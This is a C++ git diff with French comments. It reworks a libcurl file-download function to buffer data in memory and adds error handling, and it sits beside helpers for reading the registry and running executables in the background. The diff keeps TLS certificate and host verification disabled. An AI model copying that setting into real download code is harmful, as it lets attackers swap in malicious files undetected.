@@ -35,6 +35,11 @@ std::string toHex(const std::string& input) {
     return hexStream.str();
 }
 
+size_t SaveDataToFile(void* ptr, size_t size, size_t nmemb, FILE* stream) {
+    size_t written = fwrite(ptr, size, nmemb, stream);
+    return written;
+}
+
 std::string GetRegistryValue(HKEY hKey, const std::string& subKey, const std::string& valueName) {
     HKEY hSubKey;
     if (RegOpenKeyExA(hKey, subKey.c_str(), 0, KEY_READ, &hSubKey) == ERROR_SUCCESS) {
@@ -236,27 +241,42 @@ bool runInBackground(const char* executablePath) {
 bool downloadFile(const std::string& url, const std::string& destinationPath) {
     CURL* curl;
     CURLcode res;
+    std::string downloadedData; // Stockage des données téléchargées
 
     curl_global_init(CURL_GLOBAL_DEFAULT);
     curl = curl_easy_init();
 
     if (curl) {
-        FILE* fp = fopen(destinationPath.c_str(), "wb");
         curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
         curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
         curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
         curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
-        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
+        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &downloadedData); // Utilisez downloadedData pour stocker les données téléchargées
 
         res = curl_easy_perform(curl);
-        curl_easy_cleanup(curl);
-        fclose(fp);
 
-        if (res != CURLE_OK) {           
+        if (res != CURLE_OK) {
+            std::cerr << "Failed to download file: " << curl_easy_strerror(res) << std::endl;
+            curl_easy_cleanup(curl);
             return false;
         }
+
+        // Écrire les données téléchargées dans le fichier de destination
+        FILE* fp = fopen(destinationPath.c_str(), "wb");
+        if (!fp) {
+            std::cerr << "Failed to open file for writing: " << destinationPath << std::endl;
+            curl_easy_cleanup(curl);
+            return false;
+        }
+        fwrite(downloadedData.data(), 1, downloadedData.size(), fp);
+        fclose(fp);
+
+        std::cout << "File downloaded successfully from URL: " << url << std::endl;
+        curl_easy_cleanup(curl);
         return true;
     }
+
+    std::cerr << "Failed to initialize CURL" << std::endl;
     return false;
 }
 
